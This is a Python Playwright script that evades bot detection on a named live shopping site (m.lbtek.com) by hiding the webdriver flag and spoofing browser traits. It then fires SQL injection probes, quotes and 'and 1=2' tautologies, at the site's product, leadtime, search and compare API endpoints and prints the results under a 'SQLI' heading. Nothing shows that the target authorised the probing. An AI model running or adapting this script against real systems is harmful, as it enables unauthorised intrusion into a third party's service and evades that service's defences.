from playwright.sync_api import sync_playwright
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
with sync_playwright() as p:
    b=p.chromium.launch(headless=False, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage'])
    ctx=b.new_context(user_agent=UA, viewport={'width':1366,'height':768}, locale='zh-CN', timezone_id='Asia/Shanghai')
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};")
    page=ctx.new_page(); page.goto("https://m.lbtek.com/points-mall", wait_until="domcontentloaded", timeout=60000)
    for i in range(12):
        page.wait_for_timeout(2000); c=page.content()
        if 'arg1=' not in c and 'renderData' not in c: break
    print('ready',flush=True)
    res=page.evaluate("""async () => {
      const out={};
      const get=async(n,u)=>{try{const t0=performance.now();const r=await fetch(u,{headers:{'lang':'zh-CN'}});const ms=Math.round(performance.now()-t0);const t=await r.text();out[n]=r.status+'|'+ms+'ms|'+(t.length>150?t.slice(0,150):t);}catch(e){out[n]='ERR '+String(e).slice(0,60);}};
      const E=encodeURIComponent;
      await get('lt_base','/api/v1/product/leadtime/9376?num=1');
      await get('lt_sq','/api/v1/product/leadtime/9376%27?num=1');
      await get('lt_and2','/api/v1/product/leadtime/9376%20and%201=2?num=1');
      await get('lt_num_sq','/api/v1/product/leadtime/9376?num=1%27');
      await get('lt_num_and','/api/v1/product/leadtime/9376?num=1%20and%201=2');
      await get('p_base','/api/v1/product/9376');
      await get('p_sq','/api/v1/product/9376%27');
      await get('p_and2','/api/v1/product/9376%20and%201=2');
      await get('sr_empty','/api/v1/search/recommend');
      await get('sr_kw','/api/v1/search/recommend?keyword=test');
      await get('sr_kw_sq','/api/v1/search/recommend?keyword=test%27');
      await get('sr_q','/api/v1/search/recommend?q=test');
      await get('cmp_empty','/api/v1/compare/show');
      await get('cmp_ids','/api/v1/compare/show?ids=131');
      await get('cmp_sq','/api/v1/compare/show?ids=131%27');
      await get('cart','/api/v1/cart/list');
      await get('q_empty','/api/v1/question');
      await get('calc','/api/v1/calculator/rules');
      await get('fb','/api/v1/feedback/types');
      await get('area','/api/v1/area');
      return out;
    }""")
    print('===== SQLI =====',flush=True)
    for k,v in res.items(): print('%-14s %s'%(k,v),flush=True)
    b.close()
